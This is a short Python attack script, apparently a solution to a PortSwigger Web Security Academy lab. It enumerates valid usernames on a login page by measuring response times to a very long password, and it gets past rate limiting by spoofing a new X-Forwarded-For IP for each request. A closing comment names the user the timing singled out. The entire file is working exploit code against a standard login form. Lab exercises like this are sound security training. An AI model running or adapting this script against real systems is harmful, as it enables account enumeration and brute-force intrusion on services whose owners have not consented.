import requests as req 

url = "https://0a8500bc046e976ec1281745007500af.web-security-academy.net/login"
header = {"Upgrade-Insecure-Requests" : "0"}
password = "jackassjackassjackassjackassjackassjackassjackassjackassjackassjackassjackass"

user_file = open("../usernames")
ctr = 0
while user := user_file.readline().strip():
    a = (ctr % 256)
    b = (ctr // 256) % 256
    c = ((ctr // 256) // 256) % 256
    d = (((ctr // 256) // 256) // 256) % 256
    ctr+=1
    header = {"X-Forwarded-For" : f"{a}.{b}.{c}.{d}"}
    dat = {"username":user,"password":password}
    x = req.post(url, dat, headers=header)
    print(f"User: {user}\t\t Time: {x.elapsed.total_seconds()}")
    if "You have made too many incorrect login attempts." in (p := x.text):
        print(p)
    # User azureuser took more time so likely the correct user